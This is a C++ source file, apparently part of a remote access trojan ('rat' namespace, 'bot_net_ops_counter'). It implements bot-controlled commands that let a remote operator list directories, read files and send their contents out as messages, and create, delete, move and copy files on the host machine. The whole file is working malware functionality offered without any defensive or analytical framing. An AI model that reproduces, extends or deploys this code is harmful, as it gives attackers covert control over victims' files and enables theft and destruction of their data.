#include "rat/Handler.hpp"
#include "rat/handler/debug.hpp"
#include "rat/system.hpp"

#include <filesystem>
#include <string>

namespace rat::handler {

void Handler::handlePwdCommand() {
  const auto &current_path = std::filesystem::current_path();
  this->sendMessage(current_path.string());
  this->bot_net_ops_counter++;
  return;
}

void Handler::handleCdCommand() {
  if (command.parameters.empty()) {
    this->sendMessage("No path specified");
    this->bot_net_ops_counter++;
    return;
  }
  this->sendMessage(
      rat::system::cd(rat::system::normalizePath(command.parameters[0])));
  this->bot_net_ops_counter++;
}

void Handler::handleLsCommand() {
  std::string path = command.parameters.empty() ? "" : command.parameters[0];
  this->sendMessage(rat::system::ls(rat::system::normalizePath(path)));
  this->bot_net_ops_counter++;
}

void Handler::handleReadCommand() {
  if (command.parameters.empty()) {
    this->sendMessage("No file specified");
    this->bot_net_ops_counter++;
    return;
  }
  const std::vector<std::string> &params = command.parameters;
  for (const std::string &param : params) {
    const auto &file_path = rat::system::normalizePath(param);
    const bool &file_exists = std::filesystem::exists(file_path);
    const bool &is_regular_file = std::filesystem::is_regular_file(file_path);

    if (file_exists && is_regular_file) {
      if (std::filesystem::file_size(file_path) > 4 * KB) {
        this->sendMessage("File too large to be sent as a message, use "
                          "/get instead");

        this->bot_net_ops_counter++;
        return;
      }
      try {
        const std::string &buffer = rat::system::readFile(file_path);
        this->sendMessage(buffer);
      } catch (const std::exception &e) {
        const std::string message =
            fmt::format("Failed to read file{}", file_path.string());
        HANDLER_ERROR_LOG(message);
        this->sendMessage(message);
        this->bot_net_ops_counter++;
      }
      return;
    } else if (!is_regular_file) {
      this->sendMessage(
          fmt::format("Path: {} is not a file", file_path.string()));
      this->bot_net_ops_counter++;
      return;
    } else if (!file_exists) {
      this->sendMessage(
          fmt::format("Path: {} does not exist", file_path.string()));

      this->bot_net_ops_counter++;
      return;
    }
  }
}
void Handler::handleTouchCommand() {
  if (command.parameters.empty()) {
    this->sendMessage("No file specified");
    return;
  }

  std::string response = "Failed to create";
  for (const auto &param : command.parameters) {
    bool success = rat::system::createFile(std::filesystem::path(param));
    response = fmt::format("file: {} was {}\n", param,
                           success ? "created" : "not created");
  }
  this->sendMessage(response);

  this->bot_net_ops_counter++;
}

void Handler::handleStatCommand() {
  if (command.parameters.empty()) {
    this->sendMessage("No file specified");

    this->bot_net_ops_counter++;
    return;
  }

  std::filesystem::path p(command.parameters[0]);
  if (!std::filesystem::exists(p)) {
    this->sendMessage(
        fmt::format("File does not exist: {}", command.parameters[0]));

    this->bot_net_ops_counter++;
    return;
  }

  std::string result = fmt::format(
      "File: {}\nSize: {} bytes\nLast modified: {}", p.string(),
      std::filesystem::file_size(p),
      std::filesystem::last_write_time(p).time_since_epoch().count());
  this->sendMessage(result);

  this->bot_net_ops_counter++;
}

void Handler::handleRmCommand() {
  if (command.parameters.empty()) {
    this->sendMessage("No file specified");

    this->bot_net_ops_counter++;
    return;
  }

  std::string response;
  for (const auto &param : command.parameters) {
    const auto path = std::filesystem::path(param);
    if (!std::filesystem::exists(path)) {
      response += fmt::format("file: {} does not exist, cannot be removed\n",
                              path.string());
      continue;
    }
    bool success = rat::system::removeFile(path);
    response += fmt::format("file: {} was {}\n", param,
                            success ? "removed" : "not removed");
  }
  this->sendMessage(response);
  this->bot_net_ops_counter++;
}

void Handler::handleMvCommand() {
  if (command.parameters.size() < 2) {
    this->sendMessage("Usage: /mv <src> <dest>");
    this->bot_net_ops_counter++;
    return;
  }

  const auto source_path = std::filesystem::path(command.parameters[0]);
  const auto dist_path = std::filesystem::path(command.parameters[1]);

  if (!std::filesystem::exists(source_path)) {
    this->sendMessage(
        fmt::format("Source path {} does not exist", source_path.string()));

    this->bot_net_ops_counter++;
    return;
  }

  std::string result;
  if (rat::system::isFile(source_path)) {
    if (rat::system::isDir(dist_path)) {
      if (rat::system::renameFile(source_path,
                                  dist_path / source_path.filename())) {
        result = fmt::format("File {} moved to {}", source_path.string(),
                             (dist_path / source_path.filename()).string());
      } else {
        result = fmt::format("Failed to move file {}", source_path.string());
      }
    } else {
      if (rat::system::renameFile(source_path, dist_path)) {
        result = fmt::format("File {} renamed to {}", source_path.string(),
                             dist_path.string());
      } else {
        result = fmt::format("Failed to rename file {}", source_path.string());
      }
    }
  } else {
    if (rat::system::moveDir(source_path, dist_path)) {
      result = fmt::format("Directory {} moved to {}", source_path.string(),
                           dist_path.string());
    } else {
      result = fmt::format("Failed to move directory {}", source_path.string());
    }
  }
  this->sendMessage(result);

  this->bot_net_ops_counter++;
}

void Handler::handleCpCommand() {
  if (command.parameters.size() < 2) {
    this->sendMessage("Usage: /cp <src> <dest>");

    this->bot_net_ops_counter++;
    return;
  }

  const auto source_path = std::filesystem::path(command.parameters[0]);
  const auto dist_path = std::filesystem::path(command.parameters[1]);

  if (!std::filesystem::exists(source_path)) {
    this->sendMessage(
        fmt::format("Path: {} does not exist", source_path.string()));
    return;
  }

  if (std::filesystem::exists(dist_path)) {
    this->sendMessage(fmt::format("Path {} already exists, overwrite disabled",
                                  dist_path.string()));
    return;
  }

  bool result = false;
  if (rat::system::isFile(source_path)) {
    if (rat::system::isFile(dist_path)) {
      result = rat::system::copyFile(source_path, dist_path);
    } else {
      result = rat::system::copyFile(source_path,
                                     dist_path / source_path.filename());
    }
  } else {
    result = rat::system::copyDir(source_path, dist_path);
  }

  if (result) {
    this->sendMessage(fmt::format("Content of {} copied to {}",
                                  source_path.string(), dist_path.string()));
  } else {
    this->sendMessage(fmt::format("Failed to copy {} to {}",
                                  source_path.string(), dist_path.string()));
  }
}

} // namespace rat::handler

#undef HANDLER_DEBUG_LOG
#undef HANDLER_ERROR_LOG
#ifdef DEBUG_RAT_HANDLER
#undef DEBUG_RAT_HANDLER
#endif
